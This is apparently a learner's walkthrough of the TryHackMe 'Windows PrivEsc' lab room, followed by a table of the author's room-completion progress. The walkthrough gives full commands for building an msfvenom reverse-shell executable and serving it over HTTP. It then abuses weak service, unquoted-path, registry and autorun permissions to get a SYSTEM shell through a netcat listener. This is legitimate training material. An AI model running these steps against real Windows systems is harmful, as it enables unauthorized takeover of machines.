<h1 align="center">Windows PrivEsc</h1>
<p align="center"><img width="80px" src="https://github.com/user-attachments/assets/b455aeed-0049-4514-8a44-a93278cb6aad"><br>
2025, October 14<br> Hey there, fellow lifelong learner! I´m <a href="https://www.linkedin.com/in/rosanafssantos/">Rosana</a>,<br>
and I’m excited to join you on this adventure, part of my <code>526</code>-day-streak in<a href="https://tryhackme.com"> TryHackMe</a>.<br>
<em>Practice your Windows Privilege Escalation skills on an intentionally misconfigured Windows VM with multiple ways to get admin/SYSTEM! RDP is available. Credentials: user:password321</em>.<br>
Access it <a href="https://tryhackme.com/room/windows10privesc">here</a>.<br>
<img width="1200px" src="https://github.com/user-attachments/assets/83a6988f-c925-4606-afbc-7eb9ac245ecd"></p>

<br>
<h2 align="center">Task 1 . Deploy the Vulnerable Windows VM</h2>


<p><em>Answer the question below</em></p>

<p>1.1.Deploy the Windows VM and login using the "user" account.<br>
<code>No answer needed</code></p>

```bash
:~# xfreerdp /u:user /p:password321 /cert:ignore /v:xx.xxx.xx.xxx
```


<br>
<h2 align="center">Task 2 . Generate a Reverse Shell Executable</h2>


<p><em>Answer the question below</em></p>

<p>2.1. Generate a reverse shell executable and transfer it to the Windows VM. Check that it works!.<br>
<code>No answer needed</code></p>

```bash
:~# msfvenom -p windows/x64/shell_reverse_tcp LHOST=xx.xxx.x.xx LPORT=4444 -f exe -o program.exe
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 460 bytes
Final size of exe file: 7168 bytes
Saved as: program.exe
```

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
PS C:\PrivEsc> wget xx.xxx.x.xx:8000/program.exe -o program.exe
```

```bash
PS C:\PrivEsc> dir


    Directory: C:\PrivEsc


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----        2/22/2020   9:38 PM         222592 accesschk.exe
-a----         6/5/2020   8:32 AM            959 AdminPaint.lnk
-a----        2/22/2020   9:38 PM            232 CreateShortcut.vbs
-a----         6/5/2020   8:32 AM            990 lpe.bat
-a----        2/22/2020   9:38 PM         678312 plink.exe
-a----        2/22/2020   9:38 PM         494860 PowerUp.ps1
-a----         6/5/2020   9:06 AM          27136 PrintSpoofer.exe
-a----        2/22/2020   9:38 PM        1258824 Procmon64.exe
-a----       10/14/2025   5:59 PM           7168 program.exe
-a----        2/22/2020   9:38 PM         374944 PsExec64.exe
-a----        5/11/2020   9:23 AM         159232 RoguePotato.exe
-a----         6/5/2020   8:32 AM            221 savecred.bat
-a----        2/22/2020   9:38 PM         160768 Seatbelt.exe
-a----        2/22/2020   9:38 PM          26112 SharpUp.exe
-a----         3/6/2020   7:00 PM         229376 winPEASany.exe
```

```bash
PS C:\PrivEsc> wget xx.xxx.x.xx:8000/program.exe -o program.exe
```

```bash
:~# python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
xx.xxx.xx.xxx - - [15/Oct/2025 01:59:18] "GET /program.exe HTTP/1.1" 200 -
```

```bash
PS C:\PrivEsc> .\program.exe
```

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xxx.xx.xxx 49861
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\PrivEsc>
```


<h2 align="center">Task 3 . Service Exploits - Insecure Service Permissions</h2>


<p><em>Answer the questions below</em></p>

<p>3.1. What is the original BINARY_PATH_NAME of the daclsvc service?<br>
<code>C:\Program Files\DACL Service\daclservice.exe</code></p>


```bash
C:\PrivEsc>accesschk.exe /accepteula -uwcqv user daclsvc
RW daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

C:\PrivEsc>
```

<img width="810" height="247" alt="image" src="https://github.com/user-attachments/assets/d88cf94b-e0c5-44c2-87c2-1d98f2d9c39a" />

```bash
C:\PrivEsc>sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\PrivEsc>
```

```bash
C:\PrivEsc>sc config daclsvc binpath="\"C:\PrivEsc\program.exe\""
[SC] ChangeServiceConfig SUCCESS

C:\PrivEsc>
```

```bash
C:\PrivEsc>sc net start daclsvc
```


<h2 align="center">Task 4 . Service Explots - Unquoted Service Path</h2>


<p><em>Answer the question below</em></p>

<p>4.1. What is the BINARY_PATH_NAME of the unquotedsvc service?<br>
<code>C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe</code></p>

```bash
C:\PrivEsc>sc qc unquotedsvc
sc qc unquotedsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: unquotedsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Unquoted Path Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

```bash
C:\PrivEsc>C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\PrivEsc\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service\"
C:\Program Files\Unquoted Path Service
  Medium Mandatory Level (Default) [No-Write-Up]
  RW BUILTIN\Users
  RW NT SERVICE\TrustedInstaller
  RW NT AUTHORITY\SYSTEM
  RW BUILTIN\Administrators
```

```bash
C:\PrivEsc>copy C:\PrivEsc\program.exe "C:\Program Files\Unquoted Path Service\Common.exe"
copy C:\PrivEsc\program.exe "C:\Program Files\Unquoted Path Service\Common.exe"
        1 file(s) copied.
```

```bash
C:\PrivEsc>net start unquotedsvc
```


<h2 align="center">Task 5 . Service Exploits - Weak Registry Permissions</h2>

<p><em>Answer the question below</em></p>

<p>5.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>

```bash
C:\PrivEsc>sc qc regsvc
sc qc regsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\Insecure Registry Service\insecureregistryservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : Insecure Registry Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem
```

```bash
C:\PrivEsc>accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
accesschk.exe /accepteula -uvwqk HKLM\System\CurrentControlSet\Services\regsvc
HKLM\System\CurrentControlSet\Services\regsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
	KEY_ALL_ACCESS
  RW BUILTIN\Administrators
	KEY_ALL_ACCESS
  RW NT AUTHORITY\INTERACTIVE
	KEY_ALL_ACCESS
```

```bash
C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\program.exe /f            
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\program.exe /f
The operation completed successfully.
```

<img width="1093" height="272" alt="image" src="https://github.com/user-attachments/assets/21de0e21-54dc-4c44-8c41-4844737e3598" />

```bash
C:\PrivEsc>reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\program.exe /f            
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d C:\PrivEsc\program.exe /f
The operation completed successfully.
```

```bash
C:\PrivEsc>net start regsvc
```

<h2 align="center">Task 6 . Service Exploits - Insecure Service Executables</h2>

<p><em>Answer the question below</em></p>

<p>6.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>


```bash
C:\PrivEsc>sc qc filepermsvc
sc qc filepermsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS 
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\File Permissions Service\filepermservice.exe"
        LOAD_ORDER_GROUP   : 
        TAG                : 0
        DISPLAY_NAME       : File Permissions Service
        DEPENDENCIES       : 
        SERVICE_START_NAME : LocalSystem

```

```bash
C:\PrivEsc>accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
accesschk.exe /accepteula -quvw "C:\Program Files\File Permissions Service\filepermservice.exe"
C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
	FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
	FILE_ALL_ACCESS
  RW BUILTIN\Administrators
	FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
	FILE_ALL_ACCESS
  RW BUILTIN\Users
	FILE_ALL_ACCESS
```

<img width="1091" height="486" alt="image" src="https://github.com/user-attachments/assets/3987011c-672f-4904-a4e9-885e47f4a88d" />


```bash
C:\PrivEsc>copy C:\PrivEsc\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
copy C:\PrivEsc\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe" /Y
        1 file(s) copied.
```

```bash
C:\PrivEsc>net start filepermsvc
```

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xxx.xx.xxx 50045
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

<img width="1097" height="145" alt="image" src="https://github.com/user-attachments/assets/5f90c63d-a144-46c6-b6f9-9de57ff30862" />


<h2 align="center">Task 7 . Registry - Autoruns</h2>

<p><em>Answer the question below</em></p>

<p>7.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>

```bash
C:\PrivEsc>reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run

HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
    SecurityHealth    REG_EXPAND_SZ    %windir%\system32\SecurityHealthSystray.exe
    My Program    REG_SZ    "C:\Program Files\Autorun Program\program.exe"
```


```bash
C:\PrivEsc>accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

<img width="765" height="365" alt="image" src="https://github.com/user-attachments/assets/1fdd08a0-5932-4305-a723-469c851e5e2b" />

```bash
C:\PrivEsc>accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"

AccessChk v4.02 - Check access of files, keys, objects, processes or services
Copyright (C) 2006-2007 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\Autorun Program\program.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS
  RW WIN-QBA94KB3IOF\Administrator
        FILE_ALL_ACCESS
  RW BUILTIN\Users
        FILE_ALL_ACCESS
```

```bash
C:\PrivEsc>copy C:\PrivEsc\program.exe "C:\Program Files\Autorun Program\program.exe" /Y
        1 file(s) copied.
```

```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
```

<img width="431" height="160" alt="image" src="https://github.com/user-attachments/assets/2fa5a318-6bc7-49a4-9f3b-50fad165d46b" />


```bash
:~# apt install rdesktop
```

```bash
:~# rdesktop xx.xxx.xx.xxx
```

<img width="688" height="317" alt="image" src="https://github.com/user-attachments/assets/ceac5eb1-d409-4bbe-85d5-ca3c10bad390" />


<img width="814" height="374" alt="image" src="https://github.com/user-attachments/assets/691a7cae-8a19-4da2-8d59-c2e358c64baf" />


```bash
:~# nc -nlvp 4444
Listening on 0.0.0.0 4444
Connection received on xx.xxx.xx.xxx 49704
Microsoft Windows [Version 10.0.17763.737]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```


<h2 align="center">Task 8 . Registry - AlwaysInstallElevated</h2>

<p><em>Answer the question below</em></p>

<p>7.1. Read and follow along with the above.<br>
<code>No answer needed</code></p>



<br>
<br>
<br>

<h1 align="center">In Progress</h1>
<p align="center"><img width="1200px" src=""><br>
                  <img width="1200px" src=""></p>

<h1 align="center">My TryHackMe Journey ・ 2025, October</h1>

<div align="center"><h6>

| Date   | Room                                  |Streak   |All Time<br>Global|All Time<br>Brazil|Monthly<br>Global|Monthly<br>Brazil|Points|Rooms<br>Completed|Badges|
|:------:|:--------------------------------------|--------:|------------:|------------:|------------:|------------:|------------:|------------:|------------:|
|14      |Medium 🔗 - Windows PrivEsc, in progress| 526   |      92ⁿᵈ    |      4ᵗʰ     |      85ʰ    |     2ⁿᵈ    | 130,954  |  1,002    |    79     |
|13      |Hard 🚩 - M4tr1x: Exit Denied          | 525    |      92ⁿᵈ    |      4ᵗʰ     |      76ᵗʰ    |     2ⁿᵈ    | 130,938  |  1,002    |    79     |
|12      |Easy 🔗 - Atlas                        | 524    |     101ˢᵗ    |      4ᵗʰ     |     251ˢᵗ    |     3ʳᵈ    | 129,902  |  1,001    |    76     |
|11      |Easy 🔗 - Brute Force Heroes           | 523    |     101ˢᵗ    |      4ᵗʰ     |     217ᵗʰ    |     3ʳᵈ    | 129,878  |  1,000    |    76     |
|11      |Hard 🚩 - Rocket                       | 523    |     102ⁿᵈ    |      4ᵗʰ     |     211ˢᵗ    |     3ʳᵈ    | 129,870  |    999    |    76     |
|10      |Easy 🚩 - Shadow Trace                 | 522    |     101ˢᵗ    |      4ᵗʰ     |     159ᵗʰ    |     3ʳᵈ    | 129,810  |    998    |    76     |
|10      |Easy 🔗 - Defensive Security Intro     | 522    |     103ʳᵈ    |      4ᵗʰ     |     357ᵗʰ    |     3ʳᵈ    | 129,405  |    997    |    76     |
|10      |Easy 🔗 - 25 Days of Cyber Security, Day 2| 522|      103ʳᵈ    |      4ᵗʰ     |     355ᵗʰ    |     3ʳᵈ    | 129,405  |    996    |    76     |
|9       |Medium 🔗 - Linux Threat Detection 2   | 521    |     103ʳᵈ    |      4ᵗʰ     |     326ᵗʰ    |     3ʳᵈ    | 129,373  |    996    |    76     |
|9       |Medium 🚩 - WWBuddy                    | 521    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,293  |    995    |    76     |
|8       |Hard 🚩 - Motunui                      | 520    |     103ʳᵈ    |      4ᵗʰ     |     383ʳᵈ    |     4ᵗʰ    | 129,201  |    994    |    76     |
|8       |Easy 🔗 - Man-in-the-Middle            | 520    |     103ʳᵈ    |      4ᵗʰ     |     390ᵗʰ    |     4ᵗʰ    | 129,141  |    993    |    76     |
|7       |Medium 🚩 - Profiles, in progress      | 519    |              |              |              |            | 129,021  |    992    |    76     |
|6       |Medium 🚩 - VulnNet                    | 518    |     105ᵗʰ    |      4ᵗʰ     |     348ᵗʰ    |     5ᵗʰ    | 129,021  |    992    |    76     |
|6       |Easy 🚩 - DearQA                       | 518    |     105ᵗʰ    |      4ᵗʰ     |     333ʳᵈ    |     6ᵗʰ    | 128,991  |    991    |    76     |
|5       |Medium 🚩 - Frank & Herby try again.....| 517   |     106ᵗʰ    |      4ᵗʰ     |     300ᵗʰ    |     5ᵗʰ    | 128,931  |    990    |    76     |
|4       |Medium 🚩 - Frank & Herby make an app  | 516    |     105ᵗʰ    |      4ᵗʰ     |     233ʳᵈ    |     3ʳᵈ    | 128,871  |    989    |    76     |
|4       |Info ℹ️ - OverlayFS - CVE-2021-3493    | 516    |     105ᵗʰ    |      4ᵗʰ     |     235ᵗʰ    |     3ʳᵈ    | 128,841  |    988    |    76     |
|3       |Medium 🚩 - XDR: Operation Global Dagger2| 515  |     104ᵗʰ    |      4ᵗʰ     |     149ᵗʰ    |     3ʳᵈ    | 128,833  |    987    |    76     |
|3       |Medium 🚩 - VulnNet: dotpy             | 515    |     108ᵗʰ    |      4ᵗʰ     |     741ˢᵗ    |    11ˢᵗ    | 128,563  |    986    |    76     |
|2       |Medium 🔗 - Data Exfiltration Detection| 514    |     108ᵗʰ    |      4ᵗʰ     |     521ˢᵗ    |     8ᵗʰ    | 128,503  |    985    |    76     |
|1       |Medium 🔗 - Network Discovery Detection| 513    |     108ᵗʰ    |      4ᵗʰ     |     875ᵗʰ    |     7ᵗʰ    | 128,407  |    984    |    76     |
|1       |Medium 🚩 - Intranet                   | 513    |     108ᵗʰ    |      4ᵗʰ     |    3,357ᵗʰ   |    57ᵗʰ    | 128,335  |    983    |    76     |

</h6></div>

<br>


<p align="center">Global All Time:   92ⁿᵈ<br><img width="250px" src="https://github.com/user-attachments/assets/eaf4f19f-697a-44f8-b298-edd35ad0f179"><br>
                                              <img width="1200px" src="https://github.com/user-attachments/assets/fe8ee1e0-223c-4707-adc9-e9ac026d2d35"><br><br>
                  Brazil All Time:     4ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/f3436489-b336-4441-bfde-48b37d263611"><br>
                  Global monthly:     85ᵗʰ<br><img width="1200px" src="https://github.com/user-attachments/assets/8bd30e8d-fcee-4638-87c4-e01f343877dc"><br>
                  Brazil monthly:      2ⁿᵈ<br><img width="1200px" src="https://github.com/user-attachments/assets/9f041fb9-3ba7-4288-8202-d1c18c35ed31"></p>


<h1 align="center">Thanks for coming!</h1>
<p align="center">Follow me on <a href="https://medium.com/@RosanaFS">Medium</a>, here on <a href="https://github.com/RosanaFSS/TryHackMe">GitHub</a>, and on <a href="https://www.linkedin.com/in/rosanafssantos/">LinkedIN</a>.</p>
